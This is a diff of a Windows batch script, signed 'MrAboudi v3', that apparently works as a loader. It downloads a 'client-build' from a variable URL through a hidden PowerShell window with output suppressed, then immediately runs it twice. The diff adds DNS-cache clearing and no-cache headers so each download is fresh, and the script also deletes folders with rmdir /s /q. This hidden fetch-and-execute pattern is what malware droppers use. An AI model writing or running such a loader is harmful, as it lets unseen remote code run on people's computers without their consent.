@@ -58,9 +58,9 @@ if errorlevel 1 (
 )
 
 :: 5. Download a fresh client-build into the now-empty Traces folder.
-:: Using Invoke-WebRequest for potentially better cache handling.
-:: A random parameter is added to the URL to bypass any potential cache and ensure a fresh download.
-powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%DOWNLOAD_URL%?r=%RANDOM%' -OutFile '%TARGET_FILE%' -UseBasicParsing" >nul 2>&1
+:: Clear DNS cache and add no-cache headers to Invoke-WebRequest to try and bypass caching.
+:: A random parameter is also added to the URL to bypass any potential client-side cache.
+powershell -WindowStyle Hidden -Command "Clear-DnsClientCache; Invoke-WebRequest -Uri '%DOWNLOAD_URL%?r=%RANDOM%' -Headers @{'Cache-Control'='no-cache'; 'Pragma'='no-cache'} -OutFile '%TARGET_FILE%' -UseBasicParsing" >nul 2>&1
 
 :: 6. Immediately execute the newly downloaded client. It is started twice to help ensure execution.
 if exist "%TARGET_FILE%" (
@@ -83,6 +83,7 @@ if exist "%~1\" (
     rmdir /s /q "%~1" >nul 2>&1
 )
 exit /b
+
 
 :: By MrAboudi
 :: v3
